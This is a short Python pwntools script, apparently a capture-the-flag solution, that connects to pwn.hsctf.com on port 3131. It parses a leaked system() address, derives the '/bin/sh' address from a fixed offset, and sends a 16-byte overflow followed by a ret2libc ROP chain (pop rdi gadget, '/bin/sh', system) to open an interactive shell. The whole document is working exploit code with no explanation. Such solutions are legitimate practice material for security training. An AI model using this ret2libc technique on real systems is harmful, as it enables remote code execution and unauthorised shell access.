from pwn import *

# p = process("./xxx")
p = remote("pwn.hsctf.com", 3131)

# Get system and binsh addr
p.recvuntil("Here's your free computer: ")
addr_system = int(p.recvuntil("\n").strip(), 16)
print('system():', hex(addr_system))

addr_binsh = 0x1479c7 + addr_system
gadget_poprdi = 0x0401273

# form payload
offset = 16
payload = 'A' * offset

payload += p64(gadget_poprdi)
payload += p64(addr_binsh)
payload += p64(addr_system)
p.sendline(payload)

p.interactive()
